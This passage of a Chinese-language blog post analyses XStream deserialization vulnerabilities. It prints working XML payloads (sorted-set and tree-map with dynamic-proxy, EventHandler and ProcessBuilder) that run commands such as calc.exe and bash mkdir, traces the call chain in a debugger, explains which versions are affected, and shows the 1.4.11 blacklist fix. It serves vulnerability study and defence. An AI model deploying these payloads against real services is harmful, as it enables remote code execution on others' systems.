+<h3 id="几种PoC浅析"><a href="#几种PoC浅析" class="headerlink" title="几种PoC浅析"></a>几种PoC浅析</h3><h4 id="基于sorted-set的PoC"><a href="#基于sorted-set的PoC" class="headerlink" title="基于sorted-set的PoC"></a>基于sorted-set的PoC</h4><h5 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h5><p>1.4.5，1.4.6，1.4.10</p>
+<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>复现用的XStream版本是1.4.6。</p>
+<p>payload1.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行触发：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/2.png" alt=""></p>
+<p>如果想加入多条命令，如创建目录等，可改为如下的payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// Windows</span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>md<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>mi1k7ea<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Linux</span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>"mkdir mi1k7ea"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h5><p>下面我们在<code>xstream.fromXML()</code>语句中打上断点进行调试，同时在EventHandler类中的invoke()和invokeInternal()函数上也打上断点。</p>
+<p>在AbstractTreeMarshallingStrategy.unmarshal()函数中，调用了TreeUnmarshaller.start()函数，即开始解析XML：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/12.png" alt=""></p>
+<p>跟进start()函数，发现会调用HierarchicalStreams.readClassType()来获取到PoC XML中根标签的类类型java.util.SortedSet：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/4.png" alt=""></p>
+<p>接着是调用convertAnother()函数对java.util.SortedSet类型进行转换，我们跟进去该函数，其中调用mapper.defaultImplementationOf()函数来寻找java.util.SortedSet类型的默认实现类型进行替换，这里转换为了java.util.TreeSet类型：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/5.png" alt=""></p>
+<p>接着看到调用converterLookup.lookupConverterForType()来寻找TreeSet对应类型的转换器。我们跟进这个函数看看，其是变量所有转换器，通过调用Converter.canConvert()函数来判断该转换器是否能够转换出TreeSet类型，这里找到满足条件的TreeSetConverter转换器：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/6.png" alt=""></p>
+<p>在XStream官网中可以查到类对应的Converter：<a href="http://x-stream.github.io/javadoc/com/thoughtworks/xstream/converters/collections/TreeMapConverter.html" target="_blank" rel="noopener">http://x-stream.github.io/javadoc/com/thoughtworks/xstream/converters/collections/TreeMapConverter.html</a></p>
+<p>接着是调用<code>typeToConverterMap.put(type, converter);</code>将类型和转换器的对应关系放入Map表中，再返回转换器：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/9.png" alt=""></p>
+<p>往下调试，在AbstractReferenceUnmarshaller.convert()函数中看到，会调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/10.png" alt=""></p>
+<p>接着调用其父类即的FastStack.convert()方法，跟进去，显示将类型压入栈，然后调用转换器TreeSetConverter的unmarshal()方法：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/13.png" alt=""></p>
+<p>往下调试，在TreeSetConverter.unmarshal()函数中调用了this.treeMapConverter.populateTreeMap()：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/7.png" alt=""></p>
+<p>跟进该函数，先判断是否是第一个元素，是的话就调用putCurrentEntryIntoMap()函数，即将当前内容缓存到Map中：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/8.png" alt=""></p>
+<p>跟进去，发现调用readItem()函数读取标签内的内容并缓存到target这个Map中：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/14.png" alt=""></p>
+<p>返回到populateTreeMap()函数中，调用了<code>reader.moveUp();</code>即开始往下读其他元素，然后调用populateMap()函数：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/15.png" alt=""></p>
+<p>跟进populateMap()，其中调用了populateCollection()函数，用来循环遍历子标签中的元素并添加到集合中，如图是将动态代理标签添加进集合中：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/18.png" alt=""></p>
+<p>而调用的addCurrentElementToCollection()中，会调用readItem()读取标签内容，这里直接跳过具体的读取步骤，看到是成功获取到了该动态代理类并添加到了target这个Map缓存起来了：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/19.png" alt=""></p>
+<p>继续跟进去几个函数，会发现调用DynamicProxyConverter.unmarshal()函数，这是由于PoC中含有dynamic-proxy标签会被程序识别并调用对应的DynamicProxyConverter转换器来实现将XML中该标签部分转换成动态代理类对象。而在该转换器的unmarshal()函数中，主要是扫描该标签的内容，然后调用Proxy.newProxyInstance()函数来生成新的动态代理类对象并返回（该动态代理类的target为EventHandler，action为start）：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/22.png" alt=""></p>
+<p>在上图我们可以看到DynamicProxyConverter.unmarshal()函数中调用了convertAnother()函数来转换得到EventHandler，跟进该函数会发现是调用了ReflectionConverter转换器来进行EventHandler的解析的：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/24.png" alt=""></p>
+<p>下面继续往下调试，回到populateMap()调用的地方。</p>
+<p>调用完populateMap()之后，会判断JVM是否已充分将TreeMap都缓存起来了，然后调用TreeMap类对象resullt的putAll()方法，可看到参数中包含动态代理类，该代理类指向EventHandler类，而该类正如前面介绍时说的那样通过传入target和action参数值来利用反射机制调用了ProcessBuilder(cmd).start()来执行任意命令：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/16.png" alt=""></p>
+<p>再跟进去调试，调试到TreeMap.put()函数中发现会调用到动态代理类对象$Proxy0的compareTo()方法来比较动态代理类对象和另一个字符串对象：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/17.png" alt=""></p>
+<p><strong>由于我们PoC中interface标签写的是<code>java.lang.Comparable</code>接口，而该接口声明了一个compareTo()方法，因此当调用了动态代理类对象中的Comparable.compareTo()方法时就能成功动态调用PoC中构造的恶意动态代理类，从而通过反射机制达到任意代码执行。</strong></p>
+<p>再往下，会调用到EventHandler.invoke()，其中会通过安全管理器获得权限来执行EventHandler.invokeInternal()函数，可以看到proxy参数是动态代理类对象、\9-]参数是compareTo方法、arguments参数是包含”foo”字符串的数组：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/20.png" alt=""></p>
+<p>在EventHandler.invokeInternal()函数中，获取到目标动态代理类对象的实际方法后，就直接通过反射机制调用，从而导致弹计算器：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/21.png" alt=""></p>
+<h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>我们在PoC中构造了一对sorted-set标签，其中包含实现了Comparable接口的dynamic-proxy标签，该代理标签中又包含一个指向EventHandler的handler标签，而Eventhandler中则包含了一个ProcessBuilder的target和值为’start’的action。</p>
+<p>在XStream反序列化过程中，解析XML，将sorted-set标签识别出对应的TreeSetConverter转换器，再识别出sorted-set标签内有两个子元素，即string标签和dynamic-proxy标签；string标签会被识别出StringConverter转换器来解析出string标签内的字符串“foo”；dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象；最后由于TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。</p>
+<p><strong>整个调试过程主要的函数调用链如下：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">XStream.fromXML</span><br><span class="line">XStream.unmarshal</span><br><span class="line">AbstractTreeMarshallingStrategy.unmarshal</span><br><span class="line">TreeUnmarshaller.start</span><br><span class="line">HierarchicalStreams.readClassType</span><br><span class="line">TreeUnmarshaller.convertAnother</span><br><span class="line">DefaultConverterLookup.lookupConverterForType</span><br><span class="line">...</span><br><span class="line">TreeSetConverter.unmarshal</span><br><span class="line">TreeSetConverter.populateTreeMap</span><br><span class="line">DynamicProxyConverter.unmarshal</span><br><span class="line">...</span><br><span class="line">ReflectionConverter.canConvert</span><br><span class="line">...</span><br><span class="line">TreeMap.putAll</span><br><span class="line">AbstractMap.putAll</span><br><span class="line">TreeMap.put</span><br><span class="line">$Proxy0.compareTo</span><br><span class="line">EventHandler.invoke</span><br><span class="line">EventHandler.invokeInternal</span><br><span class="line">MethodUtil.invoke</span><br></pre></td></tr></table></figure>
+<h5 id="无法通杀-lt-1-3-1版本的原因"><a href="#无法通杀-lt-1-3-1版本的原因" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>&lt;=1.3.1以下版本不能成功识别出根标签sorted-set的类，也就是说低版本并不支持sorted-set：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.thoughtworks.xstream.mapper.CannotResolveClassException: sorted-set : sorted-set</span><br></pre></td></tr></table></figure>
+<h5 id="无法通杀1-4-1-4-5版本的原因"><a href="#无法通杀1-4-1-4-5版本的原因" class="headerlink" title="无法通杀1.4-1.4.5版本的原因"></a>无法通杀1.4-1.4.5版本的原因</h5><p>先看下TreeSetConverter.unmarshal()中的代码逻辑，当sortedMapField不为null时，treeMap才有可能不为null，treeMap不为null才能进入populateTreeMap()：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/25.png" alt=""></p>
+<p>在1.4-1.4.4版本中，sortedMapField默认为null，因此无法成功利用：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/27.png" alt=""></p>
+<p>而在&gt;=1.4.5版本中，sortedMapField默认不为null，因此能成功利用：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/26.png" alt=""></p>
+<h5 id="无法通杀1-4-7-1-4-9版本的原因"><a href="#无法通杀1-4-7-1-4-9版本的原因" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>在1.4.7版本的Change Log中有这么一句:</p>
+<blockquote>
+<p>java.bean.EventHandler no longer handled automatically because of severe security vulnerability.</p>
+</blockquote>
+<p>运行PoC会报以下错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: No converter specified for class java.beans.EventHandler</span><br><span class="line">---- Debugging information ----</span><br><span class="line">class               : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type       : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">converter-type      : com.thoughtworks.xstream.converters.extended.DynamicProxyConverter</span><br><span class="line">path                : /sorted-set/dynamic-proxy/handler</span><br><span class="line">class[1]            : java.util.TreeSet</span><br><span class="line">converter-type[1]   : com.thoughtworks.xstream.converters.collections.TreeSetConverter</span><br><span class="line">version             : 1.4.7</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure>
+<p>在ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤，导致不能成功利用：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/28.png" alt=""></p>
+<h5 id="为何1-4-10能够成功"><a href="#为何1-4-10能够成功" class="headerlink" title="为何1.4.10能够成功"></a>为何1.4.10能够成功</h5><p>我们知道1.4.7-1.4.9版本中是因为在ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤导致不能成功利用。</p>
+<p>但是我们在1.4.10中发现ReflectionConverter.canConvert()函数中把对EventHandler类的过滤又去掉了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">this</span>.type != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.type == type || <span class="keyword">this</span>.type == <span class="keyword">null</span> &amp;&amp; type != <span class="keyword">null</span>) &amp;&amp; <span class="keyword">this</span>.canAccess(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在利用的过程中虽然能够成功触发，但是控制台会输出提示未初始化XStream安全框架、会存在漏洞风险：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Security framework of XStream not initialized, XStream is probably vulnerable.</span><br></pre></td></tr></table></figure>
+<h5 id="看看1-4-11如何修补的"><a href="#看看1-4-11如何修补的" class="headerlink" title="看看1.4.11如何修补的"></a>看看1.4.11如何修补的</h5><p>直接运行，先提醒未初始化安全框架，然后报错显示安全警告、拒绝反序列化目标类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Security framework of XStream not initialized, XStream is probably vulnerable.</span><br><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: Security alert. Unmarshalling rejected.</span><br><span class="line">---- Debugging information ----</span><br><span class="line">message             : Security alert. Unmarshalling rejected.</span><br><span class="line">class               : java.beans.EventHandler</span><br><span class="line">required-type       : java.beans.EventHandler</span><br><span class="line">converter-type      : com.thoughtworks.xstream.XStream$InternalBlackList</span><br><span class="line">path                : /tree-map/entry[2]/dynamic-proxy/handler</span><br><span class="line">class[1]            : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type[1]    : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">converter-type[1]   : com.thoughtworks.xstream.converters.extended.DynamicProxyConverter</span><br><span class="line">class[2]            : java.util.TreeMap</span><br><span class="line">required-type[2]    : java.util.TreeMap</span><br><span class="line">converter-type[2]   : com.thoughtworks.xstream.converters.collections.TreeMapConverter</span><br><span class="line">version             : 1.4.11</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure>
+<p>可以看到，1.4.11以后的版本XStream新增了一个Converter类InternalBlackList，可以看到其实现的canConverter()方法中对EventHandler类、以”javax.crypto.”开头的类、以”$LazyIterator”结尾的类都进行了匹配，而其marshal()和unmarshal()方法都是直接抛出异常的，换句话说就是匹配成功的直接抛出异常即黑名单过滤：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">InternalBlackList</span> <span class="keyword">implements</span> <span class="title">Converter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InternalBlackList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">return</span> type == Void.TYPE || type == Void.class || !XStream.<span class="keyword">this</span>.securityInitialized &amp;&amp; type != <span class="keyword">null</span> &amp;&amp; (type.getName().equals(<span class="string">"java.beans.EventHandler"</span>) || type.getName().endsWith(<span class="string">"$LazyIterator"</span>) || type.getName().startsWith(<span class="string">"javax.crypto."</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"Security alert. Marshalling rejected."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"Security alert. Unmarshalling rejected."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在XStream.setupConverters()函数中注册转换器时，InternalBlackList的优先级为PRIORITY_LOW高于ReflectionConverter的优先级PRIORITY_VERY_LOW，因此会优先判断：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/31.png" alt=""></p>
+<p>因此，在后面的调试中会发现，当要寻找EventHandler类的转换器时，会返回InternalBlackList转换器：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/32.png" alt=""></p>
+<p>当调用该InternalBlackList转换器的unmarshal()方法时，直接抛出异常：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/33.png" alt=""></p>
+<h4 id="基于tree-map的PoC"><a href="#基于tree-map的PoC" class="headerlink" title="基于tree-map的PoC"></a>基于tree-map的PoC</h4><h5 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h5><p>通杀1.4.x系列有漏洞的版本，即&lt;=1.4.6或=1.4.10。</p>
+<h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>payload2.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行触发：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/3.png" alt=""></p>
+<p>可以看到，该payload涉及到的转换器是TreeMapConverter，至于其整个调用过程以及原理和前面sorted-set的差不多，只是转换器不一样了，这里就不再调试分析了。</p>
+<h5 id="为何能通杀1-4-1-4-5版本"><a href="#为何能通杀1-4-1-4-5版本" class="headerlink" title="为何能通杀1.4-1.4.5版本"></a>为何能通杀1.4-1.4.5版本</h5><p>因为本次payload用的是TreeMapConverter转换器，和前面TreeSetConverter不一样，这里不存在类似sortedMapField是否为null的限制，因为两个转换器的代理逻辑完全不一样，调试一下就清楚了。</p>
+<h5 id="无法通杀-lt-1-3-1版本的原因-1"><a href="#无法通杀-lt-1-3-1版本的原因-1" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>运行PoC会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.thoughtworks.xstream.converters.ConversionException: TreeMap does not contain &lt;comparator&gt; element</span><br></pre></td></tr></table></figure>
+<p>在TreeMapConverter.unmarshal()中看到，判断子标签节点是否有comparator，若两个if判断条件都不满足则直接抛出异常，不会进入后面的populateMap()函数，因此也不会成功触发：</p>
+<p><img src="/2019/10/21/XStream反序列化漏洞/E:/software/hexo/blog/source/_posts/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/29.png" alt=""></p>
+<h5 id="无法通杀1-4-7-1-4-9版本的原因-1"><a href="#无法通杀1-4-7-1-4-9版本的原因-1" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>和前面基于sorted-set的PoC的原因是一样的。</p>
